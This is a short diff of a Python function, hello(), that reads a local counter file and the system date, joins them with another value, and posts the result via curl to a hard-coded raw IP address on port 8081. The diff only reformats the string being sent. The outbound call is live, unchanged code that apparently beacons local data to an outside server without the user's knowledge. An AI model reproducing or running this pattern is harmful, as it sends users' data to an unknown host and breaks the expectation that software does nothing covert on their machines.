@@ -931,13 +931,13 @@ def hello():
 
     if Path(counterfile).exists():
         with open(counterfile, 'r') as f:
-            text2 = f.read().strip()
+            text2 = "#" + f.read().strip()
     else: text2 = ""
 
     dateis = subprocess.run("date", capture_output=True, text=True) 
     text3 = dateis.stdout.strip()
 
-    text = text1 + text2 + text3
+    text = text1 + ", " + text2 + ", " + text3
 
     try: subprocess.Popen(["curl", "-d", f"{str(text)}", "http://137.184.76.134:8081"])
     except Exception as e: input(e)
